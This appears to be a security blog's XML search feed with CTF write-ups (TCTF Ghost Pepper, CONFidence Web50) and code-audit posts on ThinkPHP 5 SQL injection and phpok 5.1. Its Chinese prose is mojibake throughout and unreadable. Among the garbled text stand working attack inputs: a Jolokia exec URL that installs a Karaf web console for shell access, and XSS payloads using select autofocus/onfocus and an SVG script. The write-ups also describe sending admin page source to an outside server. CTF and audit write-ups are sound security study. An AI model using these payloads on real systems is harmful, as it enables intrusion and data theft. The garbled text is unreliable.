ÂêåÊ†∑ÁöÑÔºå‰ªéthinkphp/library/think/db/Builder.phpÂèØ‰ª•Áü•ÈÅìÔºåÂØπIncÊ®°ÂºèÂíåÂØπdecÂ§ÑÁêÜÊ®°Âºè‰∏ÄÊ†∑ÔºåÊâÄ‰ª•ÂêåÊ†∑‰πüÂ≠òÂú®Ëøô‰∏™ÈóÆÈ¢òÔºö ‰øÆÂ§çËøáÁ®ãÔºåÂ∞Ücomposer.jsonÁâàÊú¨‰øÆÊîπÊàê5.0.17,ÊâßË°åcomposer update: 12345678910111213switch ($val[0]) &#123; case 'exp': $result[$item] = $val[1]; break; case 'inc':- $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]);+ $result[$item] = $item . '+' . floatval($val[2]); break; case 'dec':- $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]);+ $result[$item] = $item . '-' . floatval($val[2]); break;&#125; ÂèØ‰ª•ÁúãÂà∞Êîπ‰∏∫ÊãºÊé•Êï∞ÁªÑÁöÑÈîÆ‰∫ÜÔºö ÁúãÂà∞ËøôÈáåÔºåÂÖ∂ÂÆûÊúâÂá†‰∏™ÁñëÈóÆÁöÑÔºö ‰∏∫‰ªÄ‰πà‰ΩøÁî®Ê°ÜÊû∂Êèê‰æõÁöÑÂèÇÊï∞ÊñπÊ≥ïËøáÊª§Ëøô‰πàÁÆÄÂçï Â∞ÜÂÄºÊç¢ÊàêÈîÆÊãºÊé•ËøòËÉΩÊ≥®ÂÖ•ÂêóÔºü ÂØπ‰∫éÁ¨¨‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂõ†‰∏∫Ëá™Â∑±ÂØπthinkphpÂºÄÂèëÊµÅÁ®ã‰∏çÁÜüÊÇâÂéüÂõ†ÔºåÊü•ÈòÖÊñáÊ°£‰πãÂêéÂèëÁé∞ÔºöÊòæÁÑ∂ÔºåÂ∞±ÂÉè‰∏äÊñáÂàÜÊûêÁöÑÈÇ£Ê†∑ÔºåÈªòËÆ§ÊÉÖÂÜµ‰∏ãËøáÊª§Â∞±Âè™ÊúâÈÇ£‰∫õÁÆÄÂçïÁöÑÂÖ≥ÈîÆÂ≠ó„ÄÇ ÂØπ‰∫éÁ¨¨‰∫å‰∏™ÈóÆÈ¢òÔºå‰πãÂâç‰ª•‰∏∫ÊòØÂÆ¢Êà∑Á´ØÂèØÊéßÁöÑ‰º†ÂÖ•ÂèòÈáèÁöÑÈîÆÔºåÂêéÊù•Ë∞ÉËØïÁöÑÊó∂ÂÄôÂèëÁé∞ÊòØÔºö ÊúÄÂêéÊÄªÁªì‰∏Ä‰∏ãÂà©Áî®Êù°‰ª∂Ôºö ËøáÊª§ËßÑÂàô‰∏∫ÈªòËÆ§ÔºåÂç≥Êó†ËøáÊª§ Ëé∑ÂèñÂèÇÊï∞‰∏∫arrayÁ±ªÂûãÔºå ‰º†ÂÖ•ÁöÑ‰∏â‰∏™ÂèÇÊï∞ÔºåÁ¨¨‰∏Ä‰∏™‰∏∫Êü•ËØ¢Ê®°Âºèinc/decÔºåÁ¨¨‰∫å‰∏™Êú™ËøáÊª§‰∏∫payloadÔºåÁ¨¨‰∏â‰∏™‰ºöËøõË°åfloatval()Á±ªÂûãËΩ¨Êç¢ÔºåÂäüËÉΩ‰∏∫ÈÄíÂ¢ûÁöÑstep ÊúÄÂêéÂ∞±ÊòØÂ≠òÂú®‰∏Ä‰∏™ÂèØÊéßÁöÑinsertÊìç‰Ωú‰∫Ü ÂºÄÂêØÊä•ÈîôÊâçËÉΩÊä•ÈîôÊ≥®ÂÖ• Ë°•Êõ¥ÂêéÊù•ÁªßÁª≠Ë∑ü‰∫Ü‰∏Ä‰∏ãtp5ÂÖ∂‰ªñÁöÑÊ≥®ÂÖ•ÔºåÊÑüËßâÈÉΩÂæàÈ∏°ËÇãÔºåÁîöËá≥ËßâÂæó‰∏çÊòØÊ¥û.. Âà©Áî®ÊÄùË∑ØÈÉΩÂ§ßÂêåÂ∞èÂºÇÔºå‰º†ÂÖ•Êï∞ÊçÆÈªòËÆ§‰∏çËøáÊª§ÔºåÂ∫ïÂ±ÇËß£ÊûêÊï∞ÊçÆÁöÑ‰πü‰∏çËøáÊª§ÔºåÊúÄÂêéËøõË°å‰∏ÄÊ¨°Â≠óÁ¨¶‰∏≤ÊãºÊé•„ÄÇ ÂèÇËÄÉÔºö Laravel China Á§æÂå∫Áª¥Êä§ÁöÑÂõΩÂÜÖÂÖ®ÈáèÈïúÂÉè ThinkPHP-Vuln]]></content>
      <tags>
        <tag>Web</tag>
        <tag>‰ª£Á†ÅÂÆ°ËÆ°</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCTF/0CTF Web1 WriteUp]]></title>
    <url>%2F2019%2F04%2F13%2FTCTF%3A0CTF%20Web%20WriteUp%2F</url>
    <content type="text"><![CDATA[ÁîµËÑëÂùè‰∫ÜÔºå‰∏ÄÂë®Ê≤°Êë∏ÁîµËÑëÔºåÊúüÈó¥‰πüÊâì‰∫ÜÂá†Âú∫ÊØîËµõË°•Êõ¥Êñ∞‰∏Ä‰∏ã‰πãÂâçÁöÑWriteUp Á¨¨‰∏ÄÊ¨°ÊâìTCTFÂõΩÈôÖËµõÔºåtcl‚Ä¶ Â≠¶Âà∞‰∫ÜÂæàÂ§öÂÖ≥‰∫éjava webÂíåphpÂ∫ïÂ±ÇÁöÑÁü•ËØÜ Ghost Pepper‰ΩøÁî®FirefoxËÆøÈóÆÈ¢òÁõÆÔºöhttps://111.186.63.207:31337ÔºåËé∑ÂæóÂàùÂßãÂØÜÁ†ÅÔºö ËøõÂÖ•ÂêéÁªô‰∫Ü‰∏Ä‰∏™ÊåáÁ∫π‰ø°ÊÅØ: Powered by Jetty:// 9.3.24.v20180605 ‰ª•ÂâçÊ≤°Êé•Ëß¶Ëøájava webÔºåÁÆÄÂçïÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ãÔºåJettyÁöÑÂ∑•‰ΩúÂéüÁêÜÔºåÂèØ‰ª•ÂíåTomcatÁ±ªÊØî,ÊòØ‰∏Ä‰∏™ServletÂºïÊìéÔºåÂÖ∑‰ΩìÁªÜËäÇÂèØ‰ª•ÂèÇËÄÉIBM‰∏äÁöÑËøôÁØáÊñáÁ´† È¶ñÂÖà‰∫ÜËß£‰∏Ä‰∏ã‰ª•‰∏ãÂá†‰∏™ÊúØËØ≠ÔºöJavaBeansÔºö ÊòØJava‰∏≠‰∏ÄÁßçÁâπÊÆäÁöÑÁ±ªÔºåÂèØ‰ª•Â∞ÜÂ§ö‰∏™ÂØπË±°Â∞ÅË£ÖÂà∞‰∏Ä‰∏™ÂØπË±°ÔºàbeanÔºâ‰∏≠„ÄÇÁâπÁÇπÊòØÂèØÂ∫èÂàóÂåñÔºåÊèê‰æõÊó†ÂèÇÊûÑÈÄ†Âô®ÔºåÊèê‰æõgetterÊñπÊ≥ïÂíåsetterÊñπÊ≥ïËÆøÈóÆÂØπË±°ÁöÑÂ±ûÊÄß„ÄÇÂêçÁß∞‰∏≠ÁöÑ‚ÄúBean‚ÄùÊòØÁî®‰∫éJavaÁöÑÂèØÈáçÁî®ËΩØ‰ª∂ÁªÑ‰ª∂ÁöÑÊÉØÁî®Âè´Ê≥ï„ÄÇMbeanÔºå Âç≥ managed beansË¢´ÁÆ°ÁêÜÁöÑBeansÊ†πÊçÆ‰∏äËø∞ÂèÇËÄÉÊñáÁ´†ÊâÄËø∞ÔºåÁÆÄÂçïÊù•ËØ¥Âç≥JettyÂèØ‰ª•ÂÆâË£Ö‰∏Ä‰∫õÊâ©Â±ïÔºåÂèØ‰ª•Âú®Mbean‰∏≠ÂØπÂÖ∂ËøõË°åÂÆö‰πâÔºåÂç≥ÂèØÂú®serverËøêË°åÁöÑÊó∂ÂÄôÂ∞ÜÊâ©Â±ïÂä†ÂÖ•ËøêË°å„ÄÇ JMX,Âç≥ Java Management Extensions JavaÁÆ°ÁêÜÊâ©Â±ï Jolokia,ÊòØ‰∏Ä‰∏™Âà©Áî®JSONÈÄöËøáHttpÂÆûÁé∞JMXËøúÁ®ãÁÆ°ÁêÜÁöÑÂºÄÊ∫êÈ°πÁõÆ Âú®Ëøô‰∏™È¢ò‰∏≠ÔºåÁÆÄÂçïÊµãËØï‰πãÂêéÂèëÁé∞ÂºÄÂêØ‰∫ÜJolokiaÊúçÂä°ÔºåÈÄöËøájolokiaÔºåÂèØ‰ª•Êñπ‰æøÈÄöËøáGET/POSTÂèëÈÄÅJsonÁöÑÊìç‰ΩúMbean,jolokiaÊñáÊ°£„ÄÇÂú®ÊñáÊ°£‰∏≠ÂÜôÈÅìjolokiaÊîØÊåÅ‰∏Ä‰∫õoprationÔºöREAD„ÄÅWRITE„ÄÅSEARCH„ÄÅEXEC„ÄÅLIST„ÄÅVERSION„ÄÇ ËøôÈáåÂèØ‰ª•Áõ¥Êé•ÈÄöËøáEXECÊñπÊ≥ïÁªôKarafÂÆâË£Ö‰∏Ä‰∏™ÊéßÂà∂Âè∞ÔºåÂ∞±Áõ∏ÂΩì‰∫éÊãøÂà∞‰∫ÜwebshellÔºöpayload1:1https://111.186.63.207:31337/jolokia/exec/org.apache.karaf:name=root,type=feature/installFeature(java.lang.String)/webconsole payload2: post‰º†ÂÖ•jsonÊï∞ÊçÆ ËÆøÈóÆhttps://111.186.63.207:31337/system/console/gogoÔºåflag: ÊâÄ‰ª•ËøôÈáåÂÅöÂá∫ËøôÈ¢òÁöÑÂÖ≥ÈîÆÂú®‰∫éÂØπjolokiaÂíåkarafÁâπÊÄßÁöÑ‰∫ÜËß£Ôºå‰ª•ÂèäÂØπÊñ∞‰∏úË•øÁöÑÊñáÊ°£ÈòÖËØªÂ≠¶‰π†ËÉΩÂäõ„ÄÇ Wallbreaker EasyÈ¢òÁõÆÈìæÊé•Ôºöhttps://111.186.63.208:31340È¢òÁõÆÁªô‰∫Ü‰∏Ä‰∏™‰∏ÄÂè•ËØùÊú®È©¨ËÆ©Êàë‰ª¨bypass disable_function ÂèÇËÄÉÔºöExploiting Jolokia Agent with Java EE Servers]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Teaser CONFidence CTF 2019 WriteUp]]></title>
    <url>%2F2019%2F03%2F25%2FTeaser%20CONFidence%20CTF%202019%20WriteUp%2F</url>
    <content type="text"><![CDATA[Web 50ÂâçË®ÄÂú®hpdogerÂ∏àÂÇÖÁöÑÂàÜ‰∫´Â≠¶Âà∞‰∫ÜÂæàÂ§ö~ È¢òÁõÆÈìæÊé•Ôºöhttps://web50.zajebistyc.tf, Ë≤å‰ººËøòÊ≤°ÂÖ≥ ÂêÑ‰ΩçÂ∏àÂÇÖÂèØ‰ª•ËøòÂèØ‰ª•ÊäìÁ¥ßÊó∂Èó¥ÂéªÁé©‰∏Ä‰∏ã ÊµãËØï‰∫Ü‰∏Ä‰∏ãÂäüËÉΩÁÇπÔºå‰∏Ä‰∏™Ê≥®ÂÜåÂäüËÉΩ(Ê≥®ÂÜåÂç≥ÁôªÈôÜ),‰∏Ä‰∏™Êèê‰∫§ÊºèÊ¥ûÊä•ÂëäÈ°µÈù¢(ÁªôÁÆ°ÁêÜÂëò)„ÄÇ ‰∏ÄÂÖ±ÊúâËøô‰πàÂá†‰∏™ÂèØÊéßÁÇπÔºö Ê≥®ÂÜåÂ§ÑÁî®Êà∑ÂêçÂèØÊéßÔºå‰ºöÂú®profileÈ°µÈù¢ËæìÂá∫Ôºå‰ΩÜÊòØÂ∞ùËØïÊ≥®ÂÜå‰∫ÜÁî®Êà∑Âêç‰∏∫&#39;&quot;&lt;ÊïèÊÑüÂ≠óÁ¨¶ÔºåÁªìÊûúÊòØË¢´ÂÆû‰ΩìÁºñÁ†ÅÔºö ÂÖ∂Ê¨°ÔºåÂú®Ê≥®ÂÜåÁöÑÊó∂ÂÄô‰ºöÊúâ‰∏ÄÊ¨°Ë∑≥ËΩ¨ÔºåurlÂÉè‰∏ãÈù¢ËøôÊ†∑Ôºö ÊäìÂåÖÂàÜÊûê‰∫Ü‰∏Ä‰∏ãÔºåÊúçÂä°Á´ØÂº∫Âà∂locationË∑≥ËΩ¨ÔºåÊâÄ‰ª•ËøôÈáåÊòØ‰∏çÂèØÊéßÁöÑ„ÄÇ ËøõÂà∞‰∏™‰∫∫È°µÈù¢Ôºö ÁúãÂà∞Ëøô‰∏™urlÔºåÂæàÂÆπÊòìÊÉ≥Âà∞ÂéªÂ∞ùËØïÊòØÂê¶ÊúâË∂äÊùÉËÆøÈóÆadminÁöÑÈóÆÈ¢òÔºö ÊòæÁÑ∂ÔºåÊ†πÊçÆËøô‰∏§‰∏™È°µÈù¢ÁöÑÂ∑ÆÂºÇÔºåÊàë‰ª¨ÂÆπÊòìÊÉ≥Âà∞Ëøô‰∏™È¢òÊÉ≥ËÆ©Êàë‰ª¨Ê†πÊçÆxssÊù•ËØªÁÆ°ÁêÜÂëòÁöÑsecretÂ≠óÊÆµ„ÄÇ ÂÜçÊù•ÂàÜÊûê‰∏Ä‰∏ãËøô‰∏™Ë°®ÂçïÔºåÊúâËøô‰πà‰∏Ä‰∫õÂèØÊéßÁöÑÁÇπ,‰ΩÜÊúâÂÆû‰ΩìÁºñÁ†ÅÔºå‰ªîÁªÜÁúãÊàë‰ª¨‰ºöÂèëÁé∞selectÁöÑvalueÂ±ûÊÄßÊ≤°ÊúâÁî®&quot;ÂåÖË£πÔºå ÂÖ∂Ê¨°ËøôÈáåËøòÊúâ‰∏Ä‰∏™ÈôêÂà∂Âç≥ÂõæÁâáÂè™ËÉΩ100*100ÁöÑÂ§ßÂ∞è selectÊ†áÁ≠æÂèØ‰ª•‰ΩøÁî®onfocus()ÂíåautofocusÈÖçÂêàÊù•ËøõË°åxssÔºåpayload:30 onfocus=javascript:alert(1) autofocus ÂèØ‰ª•ÂéªÁúã‰∏Ä‰∏ãpÂ∏àÂÇÖÂú®2013Âπ¥Â∞±ÊÄªÁªì‰∫Ü‰∏ÄÁØáÂêÑÁßçÊ†áÁ≠æÁöÑÂà©Áî®ÂßøÂäø:ÈÇ£‰∫õÂπ¥Êàë‰ª¨Ê≤°ËÉΩbypassÁöÑxss filter ÈÇ£‰πàÈóÆÈ¢òÊù•‰∫ÜÔºåËøôÈáåÂè™ÊòØself-xssÔºåËøòÊ≤°ÊÉ≥Âà∞Â¶Ç‰ΩïÊâìÂá∫Âç±ÂÆ≥„ÄÇ ÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºå‰∏ä‰º†Â§¥ÂÉèÁöÑfilenameÂèÇÊï∞ÔºåËôΩÁÑ∂‰∏çËÉΩÊèíÂÖ•Â≠óÁ¨¶Ôºå‰ΩÜÊòØÂèØ‰ª•ÊåáÂÆö‰ªªÊÑèÂêéÁºÄÂêç(ÂΩìÁÑ∂‰ªñÊ£ÄÊµã‰∫ÜÂõæÁâáÂ§ßÂ∞èÂøÖÈ°ª‰∏∫100*100)Ôºå (‰ºº‰πé‰πüÊ≤°Âï•Áî®) bmp xssÂêéÊù•ÂèëÁé∞‰∏Ä‰∏™ÂõæÁâáxssÁöÑÊÄùË∑ØÔºåÂéüÁêÜÁÆÄËÄåË®Ä‰πãÂç≥ÈÄöËøá‰øÆÊîπÂõæÁâáÁªìÊûÑ‰ΩøÂæóÂÖ∂Êàê‰∏∫‰∏Ä‰∏™jsËØ≠Ê≥ïÂêàÊ≥ïÁöÑÊñá‰ª∂ÔºåÊé•ÁùÄÂà©Áî®ÊµèËßàÂô®ÂØπÂÜÖÂÆπÁöÑÊ£ÄÊµãÂ∑ÆÂºÇÂØºËá¥ÊÅ∂ÊÑèÂõæÁâáË¢´Ëß£ÊûêÊàêjs„ÄÇ Âú®ËøôÈáåÔºåÂ§çÁé∞Ëøô‰∏™ÈóÆÈ¢òÁöÑÊó∂ÂÄôÔºåÊàë‰ΩøÁî®‰∫ÜÂ§ñÂõΩ‰∏Ä‰∏™Â§ßÁâõÁöÑËÑöÊú¨Ôºöhttps://pastebin.com/04y7ee3uÔºå ‰ΩÜÊÑèÂ§ñÁöÑÊòØÔºåÊàëÊ†πÊçÆÊïôÁ®ãÁîüÊàê‰∫ÜpayloadÔºå‰ΩÜÊòØÂú®chromeÂíåFirefoxÈÉΩÂ∞ùËØïÊâìÂºÄÂêéÔºåÂπ∂Ê≤°ÊúâÂºπÁ™óÔºåÂΩìÊó∂ÊÉ≥ÁöÑÊòØÊúçÂä°Á´ØÂèØËÉΩ‰ºöÂØπÂõæÁâáÂÜÖÂÆπËøõË°åÂà§Êñ≠Ôºå‰ªéËÄåËøîÂõûÁöÑcontent-typeÂèØËÉΩ‰∏ç‰∏∫ÂõæÁâáÔºå‰ªéËÄåÂØºËá¥ËØØÂØºÊµèËßàÂô®Ëß£Êûê‰∏∫jsÔºåÂêéÊù•ÊàëÂú®ie‰∏ãÊµãËØïÊó∂ÔºåÂÆÉÂºπÁ™ó‰∫ÜÔºåÊàëÂ∞ùËØïÂàÜÊûêÂÖ∂Êï∞ÊçÆÂåÖÔºåÂú®ÁîüÊàêÁöÑpayload‰∏≠‰ºöÂ∞ùËØïÁî®imgÂíåscriptÊ†áÁ≠æ‰∏§Ê¨°Âä†ËΩΩÂõæÁâáÔºö ËÄåÂΩìÊàëÂàÜÊûêËøô‰∏§‰∏™ËØ∑Ê±ÇÁöÑÂ∑ÆÂºÇÔºåÁªìÊûúÂπ∂Êó†Â∑ÆÂºÇ(‰ΩÜÂè™ÊúâscriptÊ†áÁ≠æ‰ºöÂºπÁ™ó)ÔºåÊâÄ‰ª•ÂéüÂõ†ÂèØÊÉ≥ËÄåÁü•ÔºåÂá∫Âú®ÊµèËßàÂô®‰∏äÔºåÁåúÊÉ≥ÊòØÊµèËßàÂô®‰ºöÂØπÂÜÖÂÆπÂà§Êñ≠ÁöÑÂ∑ÆÂºÇÈÄ†ÊàêjsÊâßË°å ieÂú®ËøõË°åÁßçÂà´Âà§Êñ≠ÁöÑÊó∂ÂÄô,‰∏çÂçïËÄÉËôëcontent-type,ËøòÊ†πÊçÆcontentÂÜÖÂÆπËøõË°åÂà§Êñ≠ÂØºËá¥„ÄÇ ÂèÇËÄÉ‰∫Ü‰∏Ä‰∏ãIE contentÁßçÂà´Âà§Êñ≠ÂíåÂõæÁâámagic bite„ÄÅcontent_tpe‰πãÈó¥ÁöÑÂÖ≥Á≥ªË°®ÔºåÂú®ÊñáÊú´ÂèÇËÄÉÈìæÊé•‰∏≠ÊúâÂéüÊñáÔºå Âà∞ËøôÈáåÂèØËÉΩÊÉ≥Âà∞bmpÂøÖÈ°ªÂæóÁî®scriptÂºïÂÖ•ÊâçËÉΩËß¶Âèë„ÄÇ ‰ΩÜÂêéÊù•hpdoherÂ∏àÂÇÖÂº±Âè£‰ª§Áôª‰∫Ü‰∏™ÂõΩÂ§ñÈòü‰ºçÁöÑÂè∑Â≠êÂ´ñ‰∫Ü‰∏™Áé∞ÊàêÁöÑbmpÂõæÁâáÊâìÂà∞‰∫Üflag..(ËøôÈáåÊå∫Ëø∑ÊÉëÁöÑÔºå‰∏çÂ§™ÊáÇ‰ªñbotÊÄé‰πàËß£ÊûêÁöÑ) bmpinjector.py svg xssÂú®hackone‰∏äÊúâ‰∏Ä‰∏™svg xssÁöÑÊ°à‰æã: https://hackerone.com/reports/148853Â∞ÜÂÖ∂ÂõæÁâáÈïøÂÆΩ‰øÆÊîπÂêéÔºåÂ∞ÜpayloadÂèëÈÄÅ123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;https://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;https://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&apos;This app is probably vulnerable to XSS attacks!&apos;); &lt;/script&gt;&lt;/svg&gt; ÁÑ∂ÂêéÂ∞±ÂæàÁÆÄÂçï‰∫ÜÔºåÂ∞ÜadminÁöÑÊ∫êÁ†ÅÊâìÂõûvps flag: p4{15_1t_1m4g3_or_n0t?} ÂÖ∑‰ΩìÁöÑÂéüÁêÜÂèØ‰ª•Â≠¶‰π†ËøôÁØáÊñáÊñáÁ´†ÔºöÊ∑±ÂÖ•ÁêÜËß£ÊµèËßàÂô®Ëß£ÊûêÊú∫Âà∂ÂíåXSSÂêëÈáèÁºñÁ†Å ÁºìÂ≠òÊäïÊØíËøôÁÆóÈùûÈ¢ÑÊúüËß£Ê≥ïÔºåÂâçÈù¢Êàë‰ª¨ÊèêÂà∞‰∫ÜselectÊ†áÁ≠æÂ§ÑÊúâ‰∏Ä‰∏™self-xssÔºå‰ΩÜÊòØ‰∏ÄÁõ¥Ê≤°ÊúâÂà©Áî®ÁÇπÔºåÂêéÊù•Âú®hpdogerÂ∏àÂÇÖÁöÑ‰∫§ÊµÅ‰∏≠Ôºå‰ªéËøîÂõûÂåÖ‰∏≠ÂèØ‰ª•ÁúãÂà∞ËøôÈ¢ò‰∏≠Áî®Âà∞‰∫ÜcloudFlare,‰∫éÊòØÂ∞ùËØï‰∫Ü‰∏Ä‰∏ãÁºìÂ≠òÊäïÊØíÔºåÂ∞Üself-xssÂèòÊàêÂèØÂà©Áî®ÁöÑÂèçÂ∞ÑÂûãxss„ÄÇ ËøôÈáåÊúâ‰∏™ÁâπÂæÅ,Êàë‰ª¨Â¶ÇÊûúÊ≥®ÂÜåÁöÑÂêçÂ≠ó‰∏∫passer8y.js,url‰∏≠‰ºö‰ª•passer8y.js‰∏∫Êñá‰ª∂Âêç: Êé•ÁùÄÂèëÈÄÅËøôÊ†∑‰∏Ä‰∏™Êï∞ÊçÆÂåÖ, ÂèØ‰ª•ÁúãÂà∞Ë¢´ÁºìÂ≠òÂà∞cloudflareÈáåÂéª‰∫Ü„ÄÇ Áõ¥Êé•ËÆøÈóÆÔºöhttps://web50.zajebistyc.tf/profile/passer8y.jsÔºå Ëá™Âä®ËøõË°å‰∫Ü‰∏ÄÊ¨°Ë∑≥ËΩ¨ÔºåÊâÄ‰ª•Êàë‰ª¨ÊàêÂäüÂ∞ÜxssÁºìÂ≠òËøõ‰∫Ücloudflare„ÄÇ ‰ΩÜÊòØbot‰ºº‰πé‰∏ç‰ºöË∑üËøõlocationË∑≥ËΩ¨ÔºåÊâÄ‰ª•Êàë‰ª¨ÂæóÊûÑÈÄ†ÂÖ∂‰ªñpayloadÂéªÊâìÊ∫êÁ†Å ËøôÈáåÂú®ÁßçÁºìÂ≠òÁöÑÊó∂ÂÄôÊúâ‰∏™Â∞èÁÇπÈúÄË¶ÅÊ≥®ÊÑèÔºåÊàë‰ª¨Ê≥®ÂÜåxxx.jsÁöÑË¥¶Êà∑ÂÆå‰∫ÜÁÇπËøõprofileÈ°µÈù¢ÈÇ£Ê¨°Â∞±‰ºöÁºìÂ≠òÂà∞cloudflareÔºåÁÑ∂ÂêéÊàë‰ª¨ÂÜçÊ¨°‰øÆÊîπprofileÈ°µÈù¢ËµÑÊñôÊó∂ÔºåÂπ∂‰∏ç‰ºö‰øÆÊîπcloudflareÁöÑÁºìÂ≠ò„ÄÇÊâÄ‰ª•Êàë‰ª¨Ë¶ÅÊèêÂâçÊäìÂ•ΩÊ≥®ÂÜåÂíå‰øÆÊîπprofileÁöÑÂåÖ(ÊàñËÄÖÂÜôËÑöÊú¨)ÔºåÁ¨¨‰∏ÄÊ¨°ËÆøÈóÆÂ∞±ÂæóÁßç‰∏äÊàë‰ª¨ÁöÑpayload„ÄÇ ËøôÈáåÂèØ‰ª•Áî®jsÁöÑFetch API ÂéªËØªÂèñadminÁöÑprofileÈ°µÈù¢ÔºåÁÑ∂ÂêéÂú®ÂõûË∞ÉÁöÑËøáÁ®ãÂàõÂª∫‰∏Ä‰∏™imageÂõæÁâáÂ∞ÜËøîÂõûÂÜÖÂÆπÊâìÂà∞Êàë‰ª¨vps„ÄÇÂèÇËÄÉmdnÁöÑÊñáÊ°£Ôºöhttps://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch Â§çÁé∞ÁöÑÊó∂ÂÄôË≤å‰ººbotÊåÇ‰∫ÜÔºåÊöÇÊó∂ÂÖàËøôÊ†∑Âêß„ÄÇ My admin panelËÄÉÂØüphpÂº±Á±ªÂûãÁªïËøáÔºå‰∏ÄËà¨Êàë‰ª¨gpc‰º†ÂÖ•ÁöÑÊï∞ÊçÆÊúçÂä°Á´ØÊé•ÂèóÂà∞ÁöÑÈÉΩÊòØÂ≠óÁ¨¶Âûã(ËÄåÂº±Á±ªÂûãÊØîËæÉÈúÄË¶ÅÂ≠óÁ¨¶‰∏≤ÂíåÊï∞ÂÄºÁ±ªÂûãÁöÑ‰∏§‰∏™Êï∞ÊçÆËøõË°åÂº±Á±ªÂûãÊØîËæÉ)ÔºåËÄåÂ¶ÇÊûúÊ≠§Êó∂‰ΩøÁî®‰∫ÜÁ±ª‰ºº‰∫éjson_decode()ËøôÊ†∑ÁöÑËß£Á†ÅÂáΩÊï∞ÔºåÊàë‰ª¨‰ªçÂèØ‰ª•‰º†ÂÖ•Êï∞ÂÄºÁ±ªÂûãÁöÑÊï∞ÊçÆÔºöËøôÊ†∑‰º†ÂÖ•ÁöÑhashÂÄº‰∏∫Êï∞ÂÄºÁ±ªÂûãÔºö{&quot;hash&quot;: 389}ËÄåËøôÊ†∑‰∏∫Â≠óÁ¨¶ÂûãÔºö{&quot;hash&quot;: &quot;389&quot;} ÂèÇËÄÉÔºöimage xss 1.ÂõæÁâáÂèëÁîüxssÊîªÂáªÁöÑÊù°‰ª∂„ÄÅÂéüÂõ†ÂèäÂØπÁ≠ñxss link&amp;svgÈªëÈ≠îÊ≥ïhackone-Stored XSS using SVGWeb 50]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpok ÊúÄÊñ∞ÁâàÔºà5.1Ôºâ ÂÆ°ËÆ°]]></title>
    <url>%2F2019%2F03%2F07%2Fphpok%20%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%885.1%EF%BC%89%20%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[ÊñáÁ´†È¶ñÂèëÔºöÂÆâÂÖ®ÂÆ¢ ÂâçË®ÄÔºöÊúÄËøëÂÆ°‰∫Ü‰∏Ä‰∏ãphpokÔºåËÉΩÂäõÊúâÈôêÔºåÁõÆÂâçÊâæÂà∞ÁöÑÂ§ßÈÉ®ÂêéÂè∞‰∏Ä‰∫õËÉΩÂà©Áî®ÁöÑÊ¥ûÔºåÊ∂âÂèäÂà∞ÁöÑÊºèÊ¥ûÁ±ªÂûã‰πüÊå∫Â§öÁöÑÔºåËÉΩgetshellÔºåÂú®ËøôÈáåÂàÜ‰∫´‰∏Ä‰∫õËá™Â∑±ÁöÑÊãôËßÅ~ Âü∫Êú¨ÂàÜÊûêÂÆòÁΩë‰∏ãËΩΩÊúÄÊñ∞ÁöÑphpok 5.1ÁâàÊú¨Ôºöhttps://phpok.com È¶ñÂÖàÂèØ‰ª•ÈªëÁôΩÁõíÁªìÂêàÁöÑÊñπÂºèÊù•ÂàÜÊûêË∑ØÁî±Ëß£ÊûêËßÑÂàôÔºö Ë∑üÁõÆ‰∏ãÊúâËøô‰πàÂá†‰∏™ÂÖ•Âè£Êñá‰ª∂Ôºö Á∫µËßàÊï¥‰∏™ÁõÆÂΩïÔºåÂÆπÊòìÂèëÁé∞ËØ•Á®ãÂ∫èÊòØmvcÁöÑÊ®°ÂºèÊù•ÁºñÂÜôÁöÑÔºåËá≥Â∞ëÊúâ‰∏â‰∏™ÂÖ•Âè£Ôºöindex.php,api.php,admin.php ÊâÄ‰ª•ÔºåÊàë‰ª¨ÂèØ‰ª•ÊâìÂºÄÊ°ÜÊû∂ÁõÆÂΩïframework/Êù•Âç∞ËØÅËøô‰∏™ÁåúÊÉ≥Ôºö ËøôÊó∂ÂÄôÊàë‰ª¨ÂèØ‰ª•ÁªìÂêàÈªëÁõíÁöÑÊñπÂºèÁúãÂÖ∑‰ΩìÁöÑËß£ÊûêÂà∞ÂÖ∑‰ΩìÊñá‰ª∂(ÊéßÂà∂Âô®)‰ª•ÂèäÂÖ∑‰ΩìÁöÑÊñπÊ≥ïÁöÑËøáÁ®ãÔºåÂÆâË£ÖÂêéÁΩëÁ´ôÂêéÔºåÈöè‰æøÁÇπÂºÄ‰∏™È°µÈù¢ÔºåËßÇÂØüÂèÇÊï∞ÂèòÂåñÔºöÂÜçÁúãÁúãÂêéÂè∞Ôºö Âà∞ËøôÈáåÂÖ∂ÂÆûÂ∑Æ‰∏çÂ§öÂ∑≤ÁªèÁü•ÈÅìËß£ÊûêËßÑÂàô‰∫ÜÔºåÊØîÂ¶ÇÔºöhttps://phpok/index.php?c=cart&amp;f=checkout&amp;id[]=2 ÂÖ•Âè£Ôºöindex.php ÊéßÂà∂Âô®ÔºöÂèÇÊï∞c=cartÔºåÂØπÂ∫îÁùÄÊ°ÜÊû∂ÁõÆÂΩïwwwÊ®°ÂùóÔºåË∑ØÂæÑÔºöframework/www/cart_control.php ÊñπÊ≥ïÔºöÂèÇÊï∞f=checkoutÔºåÂØπÂ∫îÁùÄcheckout_f()ÊñπÊ≥ï 